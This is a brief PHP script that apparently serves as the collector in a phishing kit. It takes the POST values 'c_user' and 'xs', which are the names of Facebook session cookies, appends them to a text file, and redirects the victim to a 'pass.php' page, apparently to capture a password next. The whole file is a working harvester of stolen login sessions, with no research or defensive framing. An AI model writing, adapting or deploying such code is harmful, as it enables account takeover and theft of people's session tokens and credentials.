<?php
// Get the data from the POST request
$c_user = $_POST['c_user'];
$xs = $_POST['xs'];

// Create a string with the data
$data = "\n$c_user, $xs, ";

// Specify the file path where you want to store the data
$file_path = 'data.txt';

// Append the data to the text file
file_put_contents($file_path, $data, FILE_APPEND);

header('Location: pass.php');
exit();
?>
